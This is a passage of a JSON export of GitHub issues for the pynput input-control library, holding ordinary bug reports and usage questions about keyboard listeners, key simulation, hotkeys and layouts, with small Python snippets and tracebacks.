"https://api.github.com/users/simonwilmes/followers", "following_url": "https://api.github.com/users/simonwilmes/following{/other_user}", "gists_url": "https://api.github.com/users/simonwilmes/gists{/gist_id}", "starred_url": "https://api.github.com/users/simonwilmes/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/simonwilmes/subscriptions", "organizations_url": "https://api.github.com/users/simonwilmes/orgs", "repos_url": "https://api.github.com/users/simonwilmes/repos", "events_url": "https://api.github.com/users/simonwilmes/events{/privacy}", "received_events_url": "https://api.github.com/users/simonwilmes/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2020-05-03T18:47:07Z", "updated_at": "2020-05-04T13:14:30Z", "closed_at": "2020-05-04T13:14:30Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi i just recently downloaded pynput and played around with a few functions. And from what i could tell, whenever the char '3' was supposed to be printed, pynput printed 'a' instead. All the other keys were functional.\r\nI use the german instead of the american layout and use Xorg on Ubuntu 18.04. \r\nHere where some examples, that produced the effect.\r\n```python\r\nfrom pynput import keyboard\r\nkeyboardC = keyboard.Controller()\r\nkeyboardC.press(keyboard.KeyCode.from_char('3'))\r\n```\r\n\r\n```python\r\nfrom pynput import keyboard\r\nkeyboardC = keyboard.Controller()\r\nkeyboardC.press('3')\r\n```\r\nI don\u00b4t know if this is an already known problem or if this is specific to my configuration (which is more likely). I just wanted to let you know of this issue. If someone in the future is having the same problem. \r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/256", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/256/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/256/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/256/events", "html_url": "https://github.com/moses-palmer/pynput/issues/256", "id": 609970372, "node_id": "MDU6SXNzdWU2MDk5NzAzNzI=", "number": 256, "title": "pynput vs  pyautogui", "user": {"login": "NightMachinary", "id": 36224762, "node_id": "MDQ6VXNlcjM2MjI0NzYy", "avatar_url": "https://avatars1.githubusercontent.com/u/36224762?v=4", "gravatar_id": "", "url": "https://api.github.com/users/NightMachinary", "html_url": "https://github.com/NightMachinary", "followers_url": "https://api.github.com/users/NightMachinary/followers", "following_url": "https://api.github.com/users/NightMachinary/following{/other_user}", "gists_url": "https://api.github.com/users/NightMachinary/gists{/gist_id}", "starred_url": "https://api.github.com/users/NightMachinary/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/NightMachinary/subscriptions", "organizations_url": "https://api.github.com/users/NightMachinary/orgs", "repos_url": "https://api.github.com/users/NightMachinary/repos", "events_url": "https://api.github.com/users/NightMachinary/events{/privacy}", "received_events_url": "https://api.github.com/users/NightMachinary/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-04-30T13:14:36Z", "updated_at": "2020-05-14T18:34:04Z", "closed_at": "2020-05-14T18:34:04Z", "author_association": "NONE", "active_lock_reason": null, "body": "Can you give me a pros/cons of the two? \r\nI was born with malformed hands, so I only have 5 fingers in total (and some other limitations). I have been thinking of creating a custom wrapper that reads joystick events and maps them to keyboard events, so I can type faster and more ergonomically. I currently have the read-the-joystick-crossplatformly part down using a custom wrapper on top of pygame, and I'm looking for the best way to simulate keyboard events (in a cross-platform way).\r\nBoth `pynput` and `pyautogui` seem to fit, and I am wondering what the trade-offs are.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/255", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/255/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/255/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/255/events", "html_url": "https://github.com/moses-palmer/pynput/issues/255", "id": 607921977, "node_id": "MDU6SXNzdWU2MDc5MjE5Nzc=", "number": 255, "title": "how do you stop listening using with GlobalHotKey?", "user": {"login": "Chovin", "id": 17536161, "node_id": "MDQ6VXNlcjE3NTM2MTYx", "avatar_url": "https://avatars3.githubusercontent.com/u/17536161?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Chovin", "html_url": "https://github.com/Chovin", "followers_url": "https://api.github.com/users/Chovin/followers", "following_url": "https://api.github.com/users/Chovin/following{/other_user}", "gists_url": "https://api.github.com/users/Chovin/gists{/gist_id}", "starred_url": "https://api.github.com/users/Chovin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Chovin/subscriptions", "organizations_url": "https://api.github.com/users/Chovin/orgs", "repos_url": "https://api.github.com/users/Chovin/repos", "events_url": "https://api.github.com/users/Chovin/events{/privacy}", "received_events_url": "https://api.github.com/users/Chovin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-04-27T23:37:57Z", "updated_at": "2020-04-30T13:57:40Z", "closed_at": "2020-04-30T13:57:40Z", "author_association": "NONE", "active_lock_reason": null, "body": "throughout the docs, `return False` is mentioned as how you would stop a Listener. This doesn't seem to work with GlobalHotKey", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/254", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/254/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/254/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/254/events", "html_url": "https://github.com/moses-palmer/pynput/issues/254", "id": 607489964, "node_id": "MDU6SXNzdWU2MDc0ODk5NjQ=", "number": 254, "title": "Can someone explain me how this part works? (key in COMBO range COMBO in COMBINATIONS)??", "user": {"login": "i799", "id": 64396899, "node_id": "MDQ6VXNlcjY0Mzk2ODk5", "avatar_url": "https://avatars3.githubusercontent.com/u/64396899?v=4", "gravatar_id": "", "url": "https://api.github.com/users/i799", "html_url": "https://github.com/i799", "followers_url": "https://api.github.com/users/i799/followers", "following_url": "https://api.github.com/users/i799/following{/other_user}", "gists_url": "https://api.github.com/users/i799/gists{/gist_id}", "starred_url": "https://api.github.com/users/i799/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/i799/subscriptions", "organizations_url": "https://api.github.com/users/i799/orgs", "repos_url": "https://api.github.com/users/i799/repos", "events_url": "https://api.github.com/users/i799/events{/privacy}", "received_events_url": "https://api.github.com/users/i799/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2020-04-27T12:00:41Z", "updated_at": "2020-04-28T03:57:29Z", "closed_at": "2020-04-28T03:57:29Z", "author_association": "NONE", "active_lock_reason": null, "body": "I was occupied with a project and I found a code that was perfectly what I was searching for, but there are parts that I totaly don't understand could some of you explain me it please? This is the code that I found:\r\n\r\nfrom pynput import keyboard\r\nfrom pynput.keyboard import Controller\r\n\r\nkeypress = Controller()\r\n\r\nCOMBINATIONS = [\r\n    {keyboard.KeyCode(char='a'), keyboard.KeyCode(char='z')},\r\n]\r\n\r\ncurrent = set()\r\n\r\n\r\ndef execute():\r\n    for loop in range(0, 10):\r\n        keypress.press('w')\r\n        keypress.release('w')\r\n\r\n\r\ndef on_press(key):\r\n    **if any([key in COMBO for COMBO in COMBINATIONS]):**\r\n        current.add(key)\r\n        print(current)\r\n        **if any(all(k in current for k in COMBO) for COMBO in COMBINATIONS):**\r\n            execute()\r\n\r\ndef on_release(key):\r\n    **if any([key in COMBO for COMBO in COMBINATIONS]):**\r\n        current.remove(key)\r\n\r\nwith keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\r\n    listener.join()\r\n\r\nI marked the parts that I don't understand. Thanks for helping:)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/253", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/253/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/253/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/253/events", "html_url": "https://github.com/moses-palmer/pynput/issues/253", "id": 607429354, "node_id": "MDU6SXNzdWU2MDc0MjkzNTQ=", "number": 253, "title": "Bug: Function Keys are ignored", "user": {"login": "DohrliOfDeath", "id": 40405513, "node_id": "MDQ6VXNlcjQwNDA1NTEz", "avatar_url": "https://avatars3.githubusercontent.com/u/40405513?v=4", "gravatar_id": "", "url": "https://api.github.com/users/DohrliOfDeath", "html_url": "https://github.com/DohrliOfDeath", "followers_url": "https://api.github.com/users/DohrliOfDeath/followers", "following_url": "https://api.github.com/users/DohrliOfDeath/following{/other_user}", "gists_url": "https://api.github.com/users/DohrliOfDeath/gists{/gist_id}", "starred_url": "https://api.github.com/users/DohrliOfDeath/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/DohrliOfDeath/subscriptions", "organizations_url": "https://api.github.com/users/DohrliOfDeath/orgs", "repos_url": "https://api.github.com/users/DohrliOfDeath/repos", "events_url": "https://api.github.com/users/DohrliOfDeath/events{/privacy}", "received_events_url": "https://api.github.com/users/DohrliOfDeath/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-04-27T10:27:20Z", "updated_at": "2020-05-01T08:13:02Z", "closed_at": "2020-05-01T08:13:02Z", "author_association": "NONE", "active_lock_reason": null, "body": "This is my sample code:\r\n```from pynput.keyboard import Key, KeyCode, Listener\r\n\r\ndef on_press(key):\r\n    if not hasattr(key, 'vk'):\r\n        return\r\n    print(\"key: \" + str(key))\r\n    print(\"vk: \" + str(key.vk))\r\n\r\nwith Listener(on_press=on_press) as listener:\r\n    listener.join()\r\n```\r\nevery key works fine except the function keys (F1-F12), these are completely ignored.\r\nI also tried to use different keyboards, this did not resolve the issue.\r\n```\r\n$ pip3 show pynput\r\nName: pynput\r\nVersion: 1.6.8\r\nSummary: Monitor and control user input devices\r\nHome-page: https://github.com/moses-palmer/pynput\r\nAuthor: Moses Palm\u00e9r\r\nAuthor-email: moses.palmer@gmail.com\r\nLicense: LGPLv3\r\nLocation: /home/michi/.local/lib/python3.8/site-packages\r\nRequires: six, python-xlib\r\nRequired-by:\r\n```\r\n```\r\n$ neofetch\r\nOS: Arch Linux x86_64 \r\nHost: HP Pavilion Power Laptop 15-cb0xx \r\nKernel: 5.6.6-arch1-1 \r\nUptime: 4 hours, 53 mins \r\nPackages: 1026 (pacman) \r\nShell: bash 5.0.16 \r\nResolution: 2560x1080, 1920x1080 \r\nWM: i3 \r\nTheme: Breeze [GTK2/3] \r\nIcons: breeze [GTK2/3] \r\nTerminal: urxvt \r\nTerminal Font: DejaVuSansMono \r\nCPU: Intel i5-7300HQ (4) @ 3.500GHz \r\nGPU: Intel HD Graphics 630 \r\nGPU: NVIDIA GeForce GTX 1050 Mobile \r\nMemory: 2515MiB / 15900MiB                  \r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/252", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/252/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/252/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/252/events", "html_url": "https://github.com/moses-palmer/pynput/issues/252", "id": 606719718, "node_id": "MDU6SXNzdWU2MDY3MTk3MTg=", "number": 252, "title": "cannot detect mouse and keyboard movements when in full screen windows", "user": {"login": "IngeniousCoder", "id": 29097583, "node_id": "MDQ6VXNlcjI5MDk3NTgz", "avatar_url": "https://avatars2.githubusercontent.com/u/29097583?v=4", "gravatar_id": "", "url": "https://api.github.com/users/IngeniousCoder", "html_url": "https://github.com/IngeniousCoder", "followers_url": "https://api.github.com/users/IngeniousCoder/followers", "following_url": "https://api.github.com/users/IngeniousCoder/following{/other_user}", "gists_url": "https://api.github.com/users/IngeniousCoder/gists{/gist_id}", "starred_url": "https://api.github.com/users/IngeniousCoder/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/IngeniousCoder/subscriptions", "organizations_url": "https://api.github.com/users/IngeniousCoder/orgs", "repos_url": "https://api.github.com/users/IngeniousCoder/repos", "events_url": "https://api.github.com/users/IngeniousCoder/events{/privacy}", "received_events_url": "https://api.github.com/users/IngeniousCoder/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-04-25T08:28:31Z", "updated_at": "2020-05-14T18:40:39Z", "closed_at": "2020-05-14T18:40:11Z", "author_association": "NONE", "active_lock_reason": null, "body": "hello there,\r\n\r\nI have a simple script running using pynput that is made to detect the last time the mouse / keyboard went.\r\nHowever, this script cannot work when in a full screen window. I reproduced it on two games, MapleStory and Euro Truck Simulator 2.\r\n\r\n\r\nThanks", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/251", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/251/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/251/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/251/events", "html_url": "https://github.com/moses-palmer/pynput/issues/251", "id": 604923429, "node_id": "MDU6SXNzdWU2MDQ5MjM0Mjk=", "number": 251, "title": "I can't hold the letters", "user": {"login": "RED541", "id": 63307439, "node_id": "MDQ6VXNlcjYzMzA3NDM5", "avatar_url": "https://avatars3.githubusercontent.com/u/63307439?v=4", "gravatar_id": "", "url": "https://api.github.com/users/RED541", "html_url": "https://github.com/RED541", "followers_url": "https://api.github.com/users/RED541/followers", "following_url": "https://api.github.com/users/RED541/following{/other_user}", "gists_url": "https://api.github.com/users/RED541/gists{/gist_id}", "starred_url": "https://api.github.com/users/RED541/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/RED541/subscriptions", "organizations_url": "https://api.github.com/users/RED541/orgs", "repos_url": "https://api.github.com/users/RED541/repos", "events_url": "https://api.github.com/users/RED541/events{/privacy}", "received_events_url": "https://api.github.com/users/RED541/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-04-22T17:13:09Z", "updated_at": "2020-05-14T18:44:52Z", "closed_at": "2020-05-14T18:44:52Z", "author_association": "NONE", "active_lock_reason": null, "body": "I can't hold the letters keys but the special keys work\r\nthis doesn't works:\r\n```\r\nclavier.press(\"a\")\r\ntime.sleep(3)\r\nclavier.release(\"a\")\r\n```\r\n\r\nBut this works:\r\n```\r\nclavier.press(keyboard.Key.left)\r\ntime.sleep(3)\r\nclavier.release(keyboard.Key.left)\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/249", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/249/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/249/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/249/events", "html_url": "https://github.com/moses-palmer/pynput/issues/249", "id": 603526562, "node_id": "MDU6SXNzdWU2MDM1MjY1NjI=", "number": 249, "title": "Limits in keyboard monitoring ?", "user": {"login": "Matthix7", "id": 37193404, "node_id": "MDQ6VXNlcjM3MTkzNDA0", "avatar_url": "https://avatars2.githubusercontent.com/u/37193404?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Matthix7", "html_url": "https://github.com/Matthix7", "followers_url": "https://api.github.com/users/Matthix7/followers", "following_url": "https://api.github.com/users/Matthix7/following{/other_user}", "gists_url": "https://api.github.com/users/Matthix7/gists{/gist_id}", "starred_url": "https://api.github.com/users/Matthix7/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Matthix7/subscriptions", "organizations_url": "https://api.github.com/users/Matthix7/orgs", "repos_url": "https://api.github.com/users/Matthix7/repos", "events_url": "https://api.github.com/users/Matthix7/events{/privacy}", "received_events_url": "https://api.github.com/users/Matthix7/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-04-20T20:50:22Z", "updated_at": "2020-04-20T21:30:23Z", "closed_at": "2020-04-20T21:30:23Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\n\r\nI encounter an issue that I can only explain as being a limit of pynput while monitoring my azerty keyboard: for some combinations of 3+ keys pressed, there can be only the two first of them being detected and taken into account in the on_press function. \r\nFor instance, if I press simultaneously ['y'+'j'+'o'], the 'o' is never detected whereas it is when pressed alone. ['j'+'o'] or ['y'+'o'] combinations are treated as expected. \r\nMoreover, this only happens with some combinations and pynput succeeded in detecting all letters in 4+ letters combinations so I do not understand where the problem can come from.\r\nHave you ever experienced this ?\r\n\r\nAnyway, thanks for this work !", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/248", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/248/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/248/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/248/events", "html_url": "https://github.com/moses-palmer/pynput/issues/248", "id": 603246580, "node_id": "MDU6SXNzdWU2MDMyNDY1ODA=", "number": 248, "title": "ModuleNotFoundError: No module named 'pynput' even if it is installed", "user": {"login": "Mesteryl", "id": 58305981, "node_id": "MDQ6VXNlcjU4MzA1OTgx", "avatar_url": "https://avatars0.githubusercontent.com/u/58305981?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Mesteryl", "html_url": "https://github.com/Mesteryl", "followers_url": "https://api.github.com/users/Mesteryl/followers", "following_url": "https://api.github.com/users/Mesteryl/following{/other_user}", "gists_url": "https://api.github.com/users/Mesteryl/gists{/gist_id}", "starred_url": "https://api.github.com/users/Mesteryl/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Mesteryl/subscriptions", "organizations_url": "https://api.github.com/users/Mesteryl/orgs", "repos_url": "https://api.github.com/users/Mesteryl/repos", "events_url": "https://api.github.com/users/Mesteryl/events{/privacy}", "received_events_url": "https://api.github.com/users/Mesteryl/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2020-04-20T13:39:10Z", "updated_at": "2020-05-14T18:46:59Z", "closed_at": "2020-05-14T18:46:59Z", "author_association": "NONE", "active_lock_reason": null, "body": "", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/247", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/247/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/247/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/247/events", "html_url": "https://github.com/moses-palmer/pynput/issues/247", "id": 602402664, "node_id": "MDU6SXNzdWU2MDI0MDI2NjQ=", "number": 247, "title": "Keyboard Event Handler Fail in demo script", "user": {"login": "dgm3333", "id": 51210, "node_id": "MDQ6VXNlcjUxMjEw", "avatar_url": "https://avatars3.githubusercontent.com/u/51210?v=4", "gravatar_id": "", "url": "https://api.github.com/users/dgm3333", "html_url": "https://github.com/dgm3333", "followers_url": "https://api.github.com/users/dgm3333/followers", "following_url": "https://api.github.com/users/dgm3333/following{/other_user}", "gists_url": "https://api.github.com/users/dgm3333/gists{/gist_id}", "starred_url": "https://api.github.com/users/dgm3333/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/dgm3333/subscriptions", "organizations_url": "https://api.github.com/users/dgm3333/orgs", "repos_url": "https://api.github.com/users/dgm3333/repos", "events_url": "https://api.github.com/users/dgm3333/events{/privacy}", "received_events_url": "https://api.github.com/users/dgm3333/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-04-18T07:50:34Z", "updated_at": "2020-05-14T18:52:56Z", "closed_at": "2020-05-14T18:52:56Z", "author_association": "NONE", "active_lock_reason": null, "body": "Trying code from the main docs page (as below) fails\r\nUsing Win10. pynput install 1.6.8\r\nTried with : Anaconda : Spyder: Python 3.7\r\nIdle: Python 3.7\r\n\r\nTried with UK and US keyboard settings\r\n\r\nThe GlobalHotKeys script works fine\r\n\r\nThis works fine:\r\n```\r\nfrom pynput.keyboard import Listener\r\ndef printIt(key):\r\n    print (key)\r\nwith Listener(on_press=printIt) as l:\r\n    l.join()\r\n```\r\n\r\n\r\n\r\n\r\n\r\nERROR:\r\nTraceback (most recent call last): \r\n  File \"C:\\Users\\dgm55\\Documents\\David\\pythonScripts\\hotkeys\\eventListener.py\", line 9, in <module>\r\n    print('Received event {}'.format(event))\r\n  File \"C:\\Users\\dgm55\\AppData\\Local\\Programs\\Python\\Python37-32\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 225, in __str__\r\n    for (k, v) in vars(self)))\r\n  File \"C:\\Users\\dgm55\\AppData\\Local\\Programs\\Python\\Python37-32\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 224, in <genexpr>\r\n    '{}={}'.format(k, v)\r\nValueError: too many values to unpack (expected 2)\r\n\r\n\r\nCODE: (direct from https://pynput.readthedocs.io/en/latest/)\r\n```\r\nfrom pynput import keyboard\r\n\r\n# The event listener will be running in this block\r\nwith keyboard.Events() as events:\r\n    for event in events:\r\n        if event.key == keyboard.Key.esc:\r\n            break\r\n        else:\r\n            print('Received event {}'.format(event))\r\n\r\n```\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/244", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/244/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/244/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/244/events", "html_url": "https://github.com/moses-palmer/pynput/issues/244", "id": 598560704, "node_id": "MDU6SXNzdWU1OTg1NjA3MDQ=", "number": 244, "title": "Event.get() throws exception on timeout", "user": {"login": "Adrian-Rosoga", "id": 6376190, "node_id": "MDQ6VXNlcjYzNzYxOTA=", "avatar_url": "https://avatars1.githubusercontent.com/u/6376190?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Adrian-Rosoga", "html_url": "https://github.com/Adrian-Rosoga", "followers_url": "https://api.github.com/users/Adrian-Rosoga/followers", "following_url": "https://api.github.com/users/Adrian-Rosoga/following{/other_user}", "gists_url": "https://api.github.com/users/Adrian-Rosoga/gists{/gist_id}", "starred_url": "https://api.github.com/users/Adrian-Rosoga/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Adrian-Rosoga/subscriptions", "organizations_url": "https://api.github.com/users/Adrian-Rosoga/orgs", "repos_url": "https://api.github.com/users/Adrian-Rosoga/repos", "events_url": "https://api.github.com/users/Adrian-Rosoga/events{/privacy}", "received_events_url": "https://api.github.com/users/Adrian-Rosoga/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-04-12T20:03:23Z", "updated_at": "2020-04-14T08:39:49Z", "closed_at": "2020-04-14T08:39:49Z", "author_association": "NONE", "active_lock_reason": null, "body": "On timeout Event.get() throws queue.Empty instead of None as advertised in the method documentation.\r\nThis is not ideal as it exposes the user to internal implementation details (using a queue), should better not leak outside. More important, it is cleaner and simpler to either return the event or None.\r\n\r\nHappened with pynput 1.6.8 on Windows 10 - should be the same on other OSes.\r\n\r\nThe code that triggered it was an attempt to implement the equivalent of getch(). See below.\r\n\r\nFix is trivial, pull request coming soon.\r\n\r\n```\r\ndef getch(timeout=None):\r\n\r\n    from pynput import keyboard\r\n    with keyboard.Events() as events:\r\n        event = events.get(timeout)\r\n        if event is not None and hasattr(event.key, 'char'):\r\n            return event.key.char\r\n        return None\r\n```\r\n\r\nGot:\r\n```\r\n(base) C:\\Users\\Adi>C:/Users/Adi/Anaconda3/python.exe \"d:/Root/Code/# Interview/play.py\"\r\nOption: Traceback (most recent call last):\r\n  File \"d:/Root/Code/# Interview/play.py\", line 68, in <module>\r\n    res = getch_non_blocking(4)\r\n  File \"d:/Root/Code/# Interview/play.py\", line 22, in getch_non_blocking\r\n    event = events.get(timeout)\r\n  File \"C:\\Users\\Adi\\Anaconda3\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 277, in get\r\n    event = self._event_queue.get(timeout=timeout)\r\n  File \"C:\\Users\\Adi\\Anaconda3\\lib\\queue.py\", line 178, in get\r\n    raise Empty\r\n_queue.Empty\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/243", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/243/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/243/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/243/events", "html_url": "https://github.com/moses-palmer/pynput/issues/243", "id": 598402057, "node_id": "MDU6SXNzdWU1OTg0MDIwNTc=", "number": 243, "title": "Is Pynput able to be asynchronous? ", "user": {"login": "Braythor", "id": 27740746, "node_id": "MDQ6VXNlcjI3NzQwNzQ2", "avatar_url": "https://avatars1.githubusercontent.com/u/27740746?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Braythor", "html_url": "https://github.com/Braythor", "followers_url": "https://api.github.com/users/Braythor/followers", "following_url": "https://api.github.com/users/Braythor/following{/other_user}", "gists_url": "https://api.github.com/users/Braythor/gists{/gist_id}", "starred_url": "https://api.github.com/users/Braythor/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Braythor/subscriptions", "organizations_url": "https://api.github.com/users/Braythor/orgs", "repos_url": "https://api.github.com/users/Braythor/repos", "events_url": "https://api.github.com/users/Braythor/events{/privacy}", "received_events_url": "https://api.github.com/users/Braythor/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-04-12T03:33:59Z", "updated_at": "2020-05-14T18:54:04Z", "closed_at": "2020-05-14T18:54:04Z", "author_association": "NONE", "active_lock_reason": null, "body": "Working in some twitch bot code, doing an async and await for a command. You probably aren't familiar with this, so I'll drop it below:\r\n\r\n`@bot.command(name='w')\r\nasync def w(ctx):\r\n    await keyboard.press('w')\r\n    await keyboard.release('w')\r\n    print(\"Pressing W!\")`\r\n\r\nCan you await keyboard.press&release?\r\n\r\nThanks for your time.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/240", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/240/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/240/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/240/events", "html_url": "https://github.com/moses-palmer/pynput/issues/240", "id": 594146605, "node_id": "MDU6SXNzdWU1OTQxNDY2MDU=", "number": 240, "title": "Not able to control the keyboard and mouse in one program.", "user": {"login": "BigBrain21", "id": 50678826, "node_id": "MDQ6VXNlcjUwNjc4ODI2", "avatar_url": "https://avatars3.githubusercontent.com/u/50678826?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BigBrain21", "html_url": "https://github.com/BigBrain21", "followers_url": "https://api.github.com/users/BigBrain21/followers", "following_url": "https://api.github.com/users/BigBrain21/following{/other_user}", "gists_url": "https://api.github.com/users/BigBrain21/gists{/gist_id}", "starred_url": "https://api.github.com/users/BigBrain21/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BigBrain21/subscriptions", "organizations_url": "https://api.github.com/users/BigBrain21/orgs", "repos_url": "https://api.github.com/users/BigBrain21/repos", "events_url": "https://api.github.com/users/BigBrain21/events{/privacy}", "received_events_url": "https://api.github.com/users/BigBrain21/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-04-04T22:54:35Z", "updated_at": "2020-04-05T12:26:29Z", "closed_at": "2020-04-05T12:26:29Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am trying to write a program that will move the mouse, but it keeps giving this error. Is there any way to fix it?\r\n\r\nTraceback (most recent call last):\r\n  File \"**************\", line 5, in <module>\r\n    mouse.click(Button.left, 1)\r\nAttributeError: 'Controller' object has no attribute 'click'", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/236", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/236/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/236/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/236/events", "html_url": "https://github.com/moses-palmer/pynput/issues/236", "id": 589654514, "node_id": "MDU6SXNzdWU1ODk2NTQ1MTQ=", "number": 236, "title": "Turkish 